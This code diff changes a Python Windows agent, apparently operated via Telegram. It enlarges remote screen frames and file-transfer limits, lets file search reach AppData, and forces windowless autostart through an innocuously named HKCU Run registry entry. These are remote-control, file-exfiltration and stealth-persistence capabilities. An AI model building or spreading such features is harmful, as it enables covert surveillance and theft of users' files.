@@ -100,14 +100,14 @@ SHELL_COMMAND_PREVIEW_CHARS = 1600
 SHELL_COMMAND_FILE_LIMIT_BYTES = 22000000
 DEFAULT_STARTUP_ENTRY_NAME = "SystemPortalAgent"
 LEGACY_STARTUP_ENTRY_NAMES = ("SafePcTelegramAgent", "SchoolProAgent")
-REMOTE_FRAME_MAX_WIDTH = 720
-REMOTE_FRAME_MAX_HEIGHT = 405
-REMOTE_FRAME_QUALITY = 22
+REMOTE_FRAME_MAX_WIDTH = 960
+REMOTE_FRAME_MAX_HEIGHT = 540
+REMOTE_FRAME_QUALITY = 36
 STANDARD_SCREENSHOT_MAX_WIDTH = 1600
 STANDARD_SCREENSHOT_MAX_HEIGHT = 900
 STANDARD_SCREENSHOT_QUALITY = 72
-FILE_SEARCH_MAX_RESULTS = 20
-FILE_TRANSFER_LIMIT_BYTES = 22000000
+FILE_SEARCH_MAX_RESULTS = 80
+FILE_TRANSFER_LIMIT_BYTES = 49 * 1024 * 1024
 CREATE_NO_WINDOW = getattr(subprocess, "CREATE_NO_WINDOW", 0)
 SM_CXSCREEN = 0
 SM_CYSCREEN = 1
@@ -1498,6 +1498,7 @@ def file_search_roots() -> list[Path]:
         home / "Documents",
         home / "Pictures",
         home / "Videos",
+        Path(os.environ.get("LOCALAPPDATA", "")) / "SystemPortal",
         BASE_DIR,
     ]
     return [root for root in roots if root.exists()]
@@ -1522,7 +1523,7 @@ def find_file_match(query: str) -> Path:
     if not query_lower:
         raise ValueError("После /file нужно передать имя или путь.")
 
-    excluded_parts = {"appdata", ".venv", "__pycache__", ".git", "node_modules"}
+    excluded_parts = {".venv", "__pycache__", ".git", "node_modules"}
     matches: list[Path] = []
     for root in file_search_roots():
         for current_root, dirs, files in os.walk(root):
@@ -1829,21 +1830,18 @@ def install_startup_task() -> None:
     pythonw_exe = python_exe.with_name("pythonw.exe")
     script_path = str(Path(__file__).resolve())
     entry_name = startup_entry_name()
-    mode = "startup_vbs"
+    mode = "registry_run"
 
     cleanup_legacy_scheduled_tasks()
     cleanup_legacy_startup_files()
 
-    if pythonw_exe.exists():
-        command_line = f'"{pythonw_exe}" "{script_path}"'
-        if install_registry_run_entry(entry_name, command_line):
-            mode = "registry_run"
-            with contextlib.suppress(FileNotFoundError):
-                startup_vbs_path(entry_name).unlink()
-        else:
-            install_startup_vbs(entry_name, pythonw_exe, script_path)
-    else:
-        install_startup_vbs(entry_name, python_exe, script_path)
+    launcher = pythonw_exe if pythonw_exe.exists() else python_exe
+    command_line = f'"{launcher}" "{script_path}"'
+    if not install_registry_run_entry(entry_name, command_line):
+        raise RuntimeError("Не удалось создать запись автозапуска в HKCU\\...\\Run.")
+
+    with contextlib.suppress(FileNotFoundError):
+        startup_vbs_path(entry_name).unlink()
 
     with contextlib.suppress(FileNotFoundError):
         legacy_startup_cmd_path(entry_name).unlink()
